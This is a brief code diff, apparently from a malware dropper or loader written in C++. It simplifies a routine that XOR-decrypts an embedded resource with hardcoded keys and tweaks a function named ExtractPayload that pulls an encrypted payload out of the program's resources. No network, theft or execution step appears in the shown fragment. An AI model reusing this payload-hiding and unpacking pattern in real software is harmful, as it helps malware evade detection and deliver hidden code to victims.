@@ -2,28 +2,11 @@
 
 void DecryptResource(PBYTE Buffer, const DWORD ResourceSize)
 {
-	constexpr unsigned char key1[16] = {
-    0xAB, 0x5E, 0xC7, 0xFF,
-    0x42, 0x83, 0xA8, 0x56,
-    0x87, 0x67, 0xFA, 0xEE,
-    0xD7, 0x73, 0x5F, 0x40
-    };
-
-	constexpr unsigned char key2[16] = {
-    0xDE, 0xAB, 0x44, 0x9D,
-    0xCF, 0x41, 0x3B, 0x8F,
-    0x09, 0x5C, 0xD7, 0x3E,
-    0xF8, 0x87, 0xBB, 0xCD
-    };
-
-    for (int i = 0; i < ResourceSize; i++)
-    {
-        Buffer[i] ^= key1[i % sizeof(key1)];
-        Buffer[i] ^= key2[i % sizeof(key2)];
-    }
+    constexpr unsigned char key[16] = { 0x75, 0xf5, 0x83, 0x62, 0x8d, 0xc2, 0x93, 0xd9, 0x8e, 0x3b, 0x2d, 0xd0, 0x2f, 0xf4, 0xe4, 0x8d };
+    XorDecryption(Buffer, ResourceSize, key, sizeof(key));
 }
 
-bool ExtractPayload(HMODULE ModuleHandle, const wstring& Filename, const wstring& OutputFolder)
+bool ExtractPayload(const HMODULE ModuleHandle, const wstring& Filename, const wstring& OutputFolder)
 {
     // find encrypted resource
     ResourceInfo encryptedResourceInfo = {};
